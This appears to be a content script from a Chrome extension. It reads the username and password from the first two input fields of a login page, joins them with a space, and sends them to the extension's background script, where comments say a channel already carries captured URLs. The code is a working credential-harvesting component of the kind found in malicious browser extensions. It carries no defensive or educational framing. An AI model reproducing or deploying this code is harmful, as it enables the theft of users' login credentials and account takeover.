//console.log("LAST SCRIPt")
var tagh = document.getElementsByTagName("input")// the creds page has the pass and username in an input tag so I am searching it here
username = tagh[0].value // they are always going to be the first and second values on the page so I am hard coding that in
password = tagh[1].value
var space = username.concat(" ")
// Little complicated what I did here.
// I started off by only sending the url 
// at this point I do not need to send the URL, but I need ot send the usernmae and password which are seperate events.
//since the username and password never have a space and neither do the urls I am using the space charcter to deleimit the username from the password
// i am now able to send it over in one channel that was already programmed
var both = space.concat(password)// concatinate the username with a space to the password
//console.log(username,password)
chrome.runtime.sendMessage({type: both});
    

    